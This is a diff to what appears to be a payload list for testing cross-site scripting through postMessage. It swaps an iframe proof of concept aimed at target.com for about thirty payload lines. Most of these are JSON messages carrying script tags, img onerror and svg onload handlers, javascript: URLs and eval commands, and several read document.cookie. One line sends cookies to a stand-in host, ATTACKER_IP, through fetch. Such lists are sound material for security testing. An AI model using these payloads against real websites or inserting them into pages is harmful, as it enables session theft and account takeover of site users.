@@ -1,1 +1,32 @@
-<iframe src="https://target.com" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
+{"type":"xss","data":"<img src=x onerror=alert(1)>"}
+{"action":"load","url":"javascript:alert(1)"}
+{"cmd":"eval","code":"alert(1)"}
+{"event":"navigate","path":"javascript:alert(1)"}
+{"type":"html","content":"<script>alert(1)</script>"}
+{"message":"<svg onload=alert(1)>"}
+{"template":"<img src=x onerror=alert(1)>"}
+{"payload":"<details open ontoggle=alert(1)>"}
+{"data":"alert(1)","type":"eval"}
+{"text":"<script>alert(document.cookie)</script>"}
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+javascript:alert(1)
+alert(document.cookie)
+fetch('http://ATTACKER_IP/?c='+document.cookie)
+{"origin":"*","data":"<script>alert(1)</script>"}
+{"allowAll":true,"data":"<img src=x onerror=alert(1)>"}
+{"trusted":true,"payload":"<svg onload=alert(1)>"}
+{"source":"parent","html":"<script>alert(1)</script>"}
+{"iframe":"allowed","content":"<script>alert(document.cookie)</script>"}
+{"action":"update","innerHTML":"<img src=x onerror=alert(1)>"}
+{"type":"render","template":"<img src=x onerror=alert(1)>"}
+{"event":"inject","code":"alert(1)"}
+{"msg":"eval","expression":"alert(1)"}
+{"command":"write","value":"<script>alert(1)</script>"}
+{"action":"open","url":"javascript:alert(1)"}
+{"redirect":"javascript:alert(1)"}
+{"goto":"javascript:alert(1)"}
+{"location":"javascript:alert(1)"}
+{"href":"javascript:alert(1)"}
+{"src":"javascript:alert(1)"}
+{"value":"javascript:alert(1)"}
